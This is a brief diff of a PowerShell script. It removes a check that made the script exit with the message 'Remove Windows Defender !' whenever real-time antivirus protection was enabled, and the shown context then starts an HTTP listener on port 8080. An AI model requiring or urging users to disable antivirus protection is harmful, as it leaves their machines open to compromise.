@@ -4,14 +4,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-try {
-    $mp = Get-MpPreference -ErrorAction Stop
-    if ($mp.RealTimeProtectionEnabled -eq $true) {
-        Write-Host "`n [+] Remove Windows Defender !" -ForegroundColor Red
-        Start-Sleep -Seconds 5
-        exit
-    }
-} catch {}
 
 $port = 8080
 $listener = New-Object System.Net.HttpListener
